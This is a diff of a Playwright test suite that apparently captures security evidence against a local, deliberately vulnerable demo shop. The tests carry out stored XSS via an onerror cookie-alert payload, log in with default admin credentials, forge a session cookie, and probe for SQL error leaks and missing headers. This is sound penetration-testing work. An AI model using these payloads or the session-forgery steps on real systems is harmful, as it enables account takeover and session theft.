@@ -35,17 +35,75 @@ test.describe('security evidence capture', () => {
     await page.screenshot({ path: `${SHOTS}/01b-search-union-dump.png`, fullPage: true });
   });
 
-  test('F02 stored XSS payload stored via API (admin render verified manually)', async ({ request }) => {
-    const res = await request.post(`${API}/api/products/1/reviews`, {
-      data: {
-        author: 'mallory',
-        rating: 5,
-        content: '<img src=x onerror="alert(document.cookie)">',
-      },
+  test('F01c verbose error disclosure via malformed search', async ({ page }) => {
+    // a single quote breaks the SQL -> the API returns the raw Postgres error + stack trace (F04-3)
+    // (the React UI hides it behind a generic message; the leak is at the API layer)
+    await page.goto(`${API}/api/products?q='`);
+    await page.waitForTimeout(1500);
+    const body = await page.locator('body').innerText();
+    results['F04_verbose_error'] = body.includes('unterminated quoted string') || body.includes('at ')
+      ? 'sql-error-and-stacktrace-exposed'
+      : 'not-exposed';
+    await page.screenshot({ path: `${SHOTS}/04c-verbose-error.png`, fullPage: true });
+  });
+
+  test('F02a stored XSS payload posted as public review', async ({ page }) => {
+    // log out first: the review form is open to everyone by design (D8)
+    await page.context().clearCookies();
+    await page.goto('http://localhost:5173/products/1');
+    await page.waitForTimeout(1500);
+    const form = page.locator('form', { has: page.locator('input[name=author], input[placeholder*=author i], input[placeholder*=name i]') }).first();
+    const hasForm = await form.count().then((c) => c > 0).catch(() => false);
+    if (hasForm) {
+      await form.locator('input').first().fill('mallory');
+      const content = form.locator('textarea').first();
+      await content.fill('<img src=x onerror="alert(document.cookie)">');
+      await form.locator('button[type=submit]').first().click();
+      await page.waitForTimeout(2000);
+    }
+    // verify the payload is stored raw via the API regardless of form automation
+    const reviews = await (await request_fixture_get(`${API}/api/products/1/reviews`)).json();
+    const storedRaw = JSON.stringify(reviews).includes('onerror');
+    results['F02_xss_stored'] = storedRaw ? 'raw-html-stored' : 'sanitized';
+    await page.screenshot({ path: `${SHOTS}/02a-xss-payload-posted.png`, fullPage: true });
+  });
+
+  test('F02b XSS fires in admin panel (session theft chain)', async ({ page }) => {
+    // ensure the malicious review exists
+    await request_fixture_post(`${API}/api/products/1/reviews`, {
+      author: 'mallory',
+      rating: 1,
+      content: '<img src=x onerror="alert(document.cookie)">',
     });
-    expect(res.status()).toBe(201);
-    const body = await res.json();
-    results['F02_xss_stored'] = body.content.includes('onerror') ? 'raw-html-stored' : 'sanitized';
+    // log in as admin
+    await page.goto('/login');
+    await page.fill('input[type=email]', 'admin@fashionhub.dev');
+    await page.fill('input[type=password]', 'admin123');
+    await page.click('button[type=submit]');
+    await page.waitForURL('http://localhost:5173/');
+    // open the admin panel reviews tab -> payload renders via dangerouslySetInnerHTML
+    let alertText = '';
+    page.once('dialog', (dialog) => {
+      alertText = dialog.message();
+      dialog.dismiss();
+    });
+    await page.goto('/admin');
+    await page.getByRole('button', { name: 'reviews' }).click();
+    await page.waitForTimeout(2000);
+    // allow a late dialog
+    if (!alertText) {
+      await page
+        .waitForEvent('dialog', { timeout: 3000 })
+        .then((d) => {
+          alertText = d.message();
+          return d.dismiss();
+        })
+        .catch(() => {});
+    }
+    results['F02_admin_xss'] = alertText.includes('session=')
+      ? 'xss-fired-in-admin-session'
+      : 'no-alert';
+    await page.screenshot({ path: `${SHOTS}/02b-admin-xss-alert-cookie.png`, fullPage: true });
   });
 
   test('F03 CSRF via external PoC page', async ({ page, request }) => {
@@ -73,6 +131,44 @@ test.describe('security evidence capture', () => {
     await page.screenshot({ path: `${SHOTS}/03b-email-changed-profile.png`, fullPage: true });
   });
 
+  test('F04a default credentials grant admin', async ({ page }) => {
+    await page.goto('/login');
+    await page.fill('input[type=email]', 'admin@fashionhub.dev');
+    await page.fill('input[type=password]', 'admin123');
+    await page.click('button[type=submit]');
+    await page.waitForURL('http://localhost:5173/');
+    await page.goto('/admin');
+    await page.waitForTimeout(1500);
+    const body = await page.locator('body').innerText();
+    results['F04_default_creds'] = body.includes('Admin Panel') ? 'admin-via-default-creds' : 'denied';
+    await page.screenshot({ path: `${SHOTS}/04a-default-creds-admin.png`, fullPage: true });
+  });
+
+  test('F04d missing security headers on API response', async ({ request }) => {
+    const res = await request.get(`${API}/api/products`);
+    const headers = res.headers();
+    const missing = ['content-security-policy', 'x-frame-options', 'strict-transport-security'].filter(
+      (h) => !(h in headers)
+    );
+    const poweredBy = 'x-powered-by' in headers;
+    results['F04_security_headers'] =
+      missing.length === 3 ? `missing-all${poweredBy ? '+x-powered-by' : ''}` : `partial-${missing.join(',')}`;
+    await page_fixture_screenshot_headers(`${SHOTS}/04d-missing-headers-devtools.png`, res);
+  });
+
+  test('F04e cookie flags readable via document.cookie', async ({ page }) => {
+    await page.goto('/login');
+    await page.fill('input[type=email]', 'alice@fashionhub.dev');
+    await page.fill('input[type=password]', 'alice123');
+    await page.click('button[type=submit]');
+    await page.waitForTimeout(2000);
+    const cookie = await page.evaluate(() => document.cookie);
+    results['F04_cookie_flags'] = cookie.includes('session=')
+      ? 'js-readable-no-httponly'
+      : 'not-readable';
+    await page.screenshot({ path: `${SHOTS}/04e-cookie-flags-devtools.png`, fullPage: true });
+  });
+
   test('F04 session forgery: cookie=1 grants admin', async ({ page }) => {
     await page.context().addCookies([
       { name: 'session', value: '1', domain: 'localhost', path: '/', secure: true, sameSite: 'None' },
@@ -89,3 +185,32 @@ test.describe('security evidence capture', () => {
     console.log('EVIDENCE SUMMARY:', JSON.stringify(results, null, 2));
   });
 });
+
+// small helpers so request fixtures work inside helper functions
+import { request as pwRequest } from '@playwright/test';
+async function request_fixture_get(url: string) {
+  const ctx = await pwRequest.newContext();
+  const res = await ctx.get(url);
+  ctx.dispose();
+  return res;
+}
+async function request_fixture_post(url: string, data: unknown) {
+  const ctx = await pwRequest.newContext();
+  const res = await ctx.post(url, { data });
+  ctx.dispose();
+  return res;
+}
+async function page_fixture_screenshot_headers(path: string, res: { headers(): Record<string, string> }) {
+  // render the observed response headers into a PNG via a data URL page
+  const { chromium } = await import('@playwright/test');
+  const browser = await chromium.launch();
+  const page = await browser.newPage();
+  const rows = Object.entries(res.headers())
+    .map(([k, v]) => `<tr><td>${k}</td><td>${String(v).slice(0, 60)}</td></tr>`)
+    .join('');
+  await page.setContent(
+    `<h2>GET /api/products — Response Headers</h2><table border=1 cellpadding=6>${rows}</table>`
+  );
+  await page.screenshot({ path, fullPage: true });
+  await browser.close();
+}
